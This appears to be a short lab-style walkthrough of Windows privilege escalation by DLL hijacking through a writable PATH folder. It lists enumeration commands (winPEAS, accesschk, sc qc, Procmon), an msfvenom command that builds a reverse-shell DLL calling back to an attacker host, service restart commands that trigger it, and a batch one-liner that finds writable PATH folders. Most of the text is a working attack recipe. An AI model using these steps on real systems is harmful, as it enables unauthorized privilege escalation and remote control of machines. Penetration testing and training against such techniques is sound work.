If you have **write permissions inside a folder present on PATH** you could be able to hijack a DLL loaded by a process and **escalate privileges**.

1.Use winPEAS to enumerate non-Windows services:  
`.\winPEASany.exe quiet servicesinfo`

> 2.Note that the C:\Temp directory is writable and in the PATH. Start by enumerating which of these services our user has stop and start access to:
> 
> > [+] Checking write permissions in PATH folders (DLL Hijacking)()

`.\accesschk.exe /accepteula -uvqc user dllsvc`

3.The “dllsvc” service is vulnerable to DLL Hijacking. According to the winPEAS output, the service runs the dllhijackservice.exe executable. We can confirm this manually:  
`sc qc dllsvc`

4.Run Procmon64.exe with administrator privileges. Press  
Ctrl+L to open the Filter menu. Check permissions of all folders inside PATH:  
5.Add a new filter on the Process Name matching  
dllhijackservice.exe.  
6.On the main screen, deselect registry activity and  
network activity.

7.Start the service:  
`> net start dllsvc`

8.Back in Procmon, note that a number of “NAME NOT  
FOUND” errors appear, associated with the hijackme.dll file.

9.At some point, Windows tries to find the file in the C:\Temp  
directory, which as we found earlier, is writable by our user.

10.On Kali, generate a reverse shell DLL named hijackme.dll:  
`# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f dll -o hijackme.dll`

11.Copy the DLL to the Windows VM and into the C:\Temp directory. Start a istener on Kali and then stop/start the service to trigger the exploit:  
`net stop dllsvc`  
`net start dllsvc`

alternatively search :

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```